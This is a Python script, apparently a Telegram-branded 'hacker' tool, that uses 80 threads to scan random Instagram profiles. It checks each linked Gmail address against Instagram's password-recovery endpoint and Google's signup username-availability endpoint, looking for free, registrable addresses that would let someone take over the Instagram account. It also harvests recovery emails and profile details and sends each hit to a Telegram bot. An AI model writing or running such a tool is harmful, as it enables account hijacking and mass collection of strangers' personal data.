
import requests
import time
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime
import webbrowser


try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    try:
        from cfonts import render, say
    except:
        render = lambda text, **k: text


def welcome_screen():
    # ألوان ANSI
    G = "\033[1;32m"      # أخضر قوي
    BKG = "\033[40m"      # خلفية سوداء (لو التيرمينال يدعم)
    W = "\033[1;37m"      # أبيض
    R = "\033[1;31m"      # أحمر
    RESET = "\033[0m"

    try:
        banner = render("WEB", colors=['green','white'], align='center')
        print(banner)
    except:
        print(f"""

""")

    def matrix_rain(lines=12, width=64, delay=0.02):
        chars = "01"
        for _ in range(lines):
            line = "".join(random.choice(chars) for _ in range(width))
            print(f"{G}{line}{RESET}")
            time.sleep(delay)

    def fire_loading(text, loops=9):
        flames = ["🔥","⚡","💥","🔥","⚡","💥","🔥","⚡","💥"]
        for i in range(loops):
            sys.stdout.write(f"\r{G}{text} {flames[i % len(flames)]}{RESET}")
            sys.stdout.flush()
            time.sleep(0.18)
        print()

    os.system("clear" if os.name == "posix" else "cls")
    
    matrix_rain(10, 60, 0.02)
    print()
    fire_loading("⚡ حياك الله")
    fire_loading("🔥 BY:web")
    print()
    print(f"{W}💀 Hacker Mode Activated{RESET}")
    print(f"{G}🔥 Owner : {W}a{RESET}   {G}🔗 Telegram : {W}@PP_G_0{RESET}")
    print(f"{R}--------------------------------------------------{RESET}")
    print()

welcome_screen()

# colour 
c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
cyan = "\033[1m\033[36m"
x = '\x1b[1;33m'
white = '\x1b[1;37m'
z = '\x1b[1;31m'
bi = random.randint(5,208)
ror1 = f'\x1b[38;5;{bi}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'

# Rainbow function
r = "\033[31m"  # Red
o = "\033[33m"  # Orange
y = "\033[93m"  # Yellow
g = "\033[32m"  # Green
b = "\033[34m"  # Blue
p = "\033[35m"  # Purple
reset = "\033[0m"

def rainbow(text):
    colors = [r, o, y, g, b, p]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result + reset
print(('—'*25)+'\n•𓆩WEB𓆪 @PP_G_0 •\n'+('—'*25))
print(f"""\033[32m         .e$$$$e. 
       e$$$$$$$$$$e
      $$$$$$by$$$$$$
     d$$$$$$$$$$$$$$b
     $$Almunharif$$$
    4$$$$$$$$$$$$$$$$F
    4$$$$$$$$$$$$$$$$F
     $$$" "$$$$" "$$$
     $$F   4$$F   4$$
     '$F ❌4$$F❌ 4$"
      $$   $$$$   $P
      4$$$$$"^$$$$$%
       $$$$F🔞4$$$$
        "$$$ee$$$"
        . *$$$$F4
         $ ⚰️⚰️.$
         "$$$$$$"
          ^$$$$
 4$$c       ""       .$$r
 ^$$$b              e$$$"
 d$$$$$e          z$$$$$b
4$$$*$$$$$c    .$$$$$*$$$r
 ""    ^*$$$be$$$*"    ^"
          "$$$$"
        .d$$P$$$b
       d$$P   ^$$$b
   .ed$$$"      "$$$be.
 $$$$$$P         *$$$$$$
4$$$$$             $$$$$$"
 "*$$$"              ^$$$$""")
print(('—'*25)+'\n•𓆩WEB𓆪 @PP_G_0 •\n'+('—'*25))
# بعد شاشة الترحيب يطلب التوكن و ID
token = input(rainbow("Token Enter : "))
print("")
ID = input(rainbow("ID Enter : "))
os.system('clear')

# بقية المتغيرات والحسابات
total = 0
hits = 0
bad_gm = 0
bad_mail = 0
goodig = 0
infoinsta = {}
import requests
yy = 'azertyuiopmlkjhgfdsqwxcvbn'

def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def check_gmail(email):
    global bad_mail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }

        params = {'TL': tl}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bad_mail+=1
          pppp()
    except:''
def check(email):
    global goodig, bad_gm
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        goodig += 1
        pppp()
    else:
        bad_gm += 1
        pppp()

def rest_check(username):
    """فحص REST API للتحقق من صحة الإيميل"""
    try:
        headers = {
            "Host": "i.instagram.com",
            "Connection": "keep-alive",
            "Content-Length": "359",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ar-IQ, en-US",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Instagram 100.0.0.17.129 Android (33/13; 320dpi; 720x1532; INFINIX/Infinix; Infinix X6528; Infinix-X6528; X6528; ar_IQ; 161478664)",
            "X-IG-App-ID": "567067343352427",
            "X-IG-Connection-Type": "WIFI",
            "X-IG-Connection-Speed": "-1kbps",
            "X-IG-Bandwidth-Speed-KBPS": "-1.000",
            "X-IG-Bandwidth-TotalBytes-B": "0",
            "X-IG-Bandwidth-TotalTime-MS": "0",
            "X-IG-Capabilities": "3brTvw==",
            "X-Bloks-Version-Id": "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
            "X-Pigeon-Session-Id": "75aa16c2-f5c4-4ff8-b52b-ed33d0ca3620",
            "X-Pigeon-Rawclienttime": "1766043263.690",
            "X-FB-HTTP-Engine": "Liger",
            "Cookie": "mid=aTbHEwABAAGG8B3U7Q_PspSdxUwQ; csrftoken=83wR0cGH8gzQCBSgQpoUuM0MxgInWcYf"
        }
        data = f'signed_body=f209291accbe606e50f0596c873e55bf80ecbbe9c3ca6ea50d3f7f65b5d652a1.%7B%22_csrftoken%22%3A%2283wR0cGH8gzQCBSgQpoUuM0MxgInWcYf%22%2C%22adid%22%3A%227440f0b8-f9b0-47a6-b7d6-bbf1756a44d2%22%2C%22guid%22%3A%2257c7b6e7-9663-4c06-a018-72708a87ecfe%22%2C%22device_id%22%3A%22android-1ec6ed72b9f98b3b%22%2C%22query%22%3A%22{username}%22%7D&ig_sig_key_version=4'
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).json()
        
        if 'email' in response:
            email = response['email']
            return email
        else:
            return 'no_email'
    except Exception as e:
        return 'error'
  
def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019)
        ]
        
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    
    except Exception:
        pass
        
def InfoAcc(username, gg):
    global total

    rr= infoinsta.get(username,{})

    Id = rr.get('pk', None)
    full_name = rr.get('full_name', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
    isPraise = rr.get('is_private', None)
    bio = rr.get('biography', None)
    is_verified = rr.get('is_verified', None)
    try:
        hy = int(Id) if Id != 'none' else None
        datte = date(hy) if hy else 'none'
    except:
        datte = 'none'

    # جلب REST API والتحقق منه
    rest_email = rest_check(username)
    
    # التحقق من صحة الـ REST
    rest_status = "❌ Bad"
    if rest_email != 'no_email' and rest_email != 'error':
        # استخراج الجزء المحلي من الإيميل (قبل @)
        if '@' in rest_email:
            local_part = rest_email.split('@', 1)[0]
            
            # إزالة النجوم (*) إذا وجدت
            chars = [c for c in local_part if c != '*']
            
            if chars:  # تأكد أن القائمة ليست فارغة
                v1 = chars[0]  # الحرف الأول
                v2 = chars[-1]  # الحرف الأخير
                b1 = username[0]  # الحرف الأول من اليوزر
                b2 = username[-1]  # الحرف الأخير من اليوزر
                
                if v1 == b1 and v2 == b2:
                    rest_status = "✅ Good"
                else:
                    rest_status = "❌ Bad"
            else:
                rest_status = "❌ Bad"
        else:
            rest_status = "❌ Bad"
    
    total += 1
    ss = f'''New Instagram
𒋨——————𝐖𝐄𝐁——————𒋨   
❖ - USERNAME :  @{username}
❖ - NAME :   {full_name}
❖️ - Followers :   {fows}
❖ - Following : {fowg}
❖ - Posts : {pp}
❖ - Data  : {datte}
❖️ - EMAIL :  {username}@{gg}
❖ - REST Status : {rest_status}
❖ - Private : {'Yes' if isPraise else 'No'}
𒋨——————𝐖𝐄𝐁——————𒋨 
 BY : @PP_G_0
'''
    print(ss)
    with open('Web.txt', 'a') as ff:
        ff.write(f'{ss}\n')

    try:
        try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
        except:pass
    except Exception as e:
        pass

# ===============================
# تم تعديل شاشة الحالة هنا
# ===============================
# ===============================
# شاشة الحالة
# ===============================
def pppp():
    """عرض الحالة الحية أثناء الفحص"""
    true_color = '\033[1;32m'    # أخضر
    false_color = '\033[1;31m'   # أحمر
    bad_color = '\033[1;33m'     # أصفر
    reset = '\033[0m'
    deco = '🥷'  # زخرفة بسيطة

    sys.stdout.write(f'''\r{deco} {true_color}Hits : [{hits}]{reset} ~ {false_color}False : [{bad_gm}]{reset} ~ {bad_color}Bad Email : [{bad_mail}]{reset} {deco} \r''')
    sys.stdout.flush()


# ===============================

# ===============================
def gg():
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({
                "id": "".join(random.choice('1234567890') for _ in range(random.randint(9, 10))),
                "render_surface": "PROFILE"
            }),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
            )
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            followers = account.get('follower_count', 31)  # ثابت فوق ٣٠ تكدر تعدلة سوي ١٠٠ وفك 
            posts = account.get('media_count', 0)

            if username and followers >= 30 and posts >= 0:
                infoinsta[username] = account
                emails = [username + '@gmail.com']
                for email in emails:
                    check(email)
        except Exception:
            pass

def start_threads(num_threads=80):
    for _ in range(num_threads):
        Thread(target=gg, daemon=True).start()  

# ===============================
# ===============================
def start_threads(num_threads=80):
    for _ in range(num_threads):
        Thread(target=gg, daemon=True).start()  


if __name__ == "__main__":
    start_threads(80)

    
    try:
        while True:
            pppp()
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nتم إيقاف البرنامج")
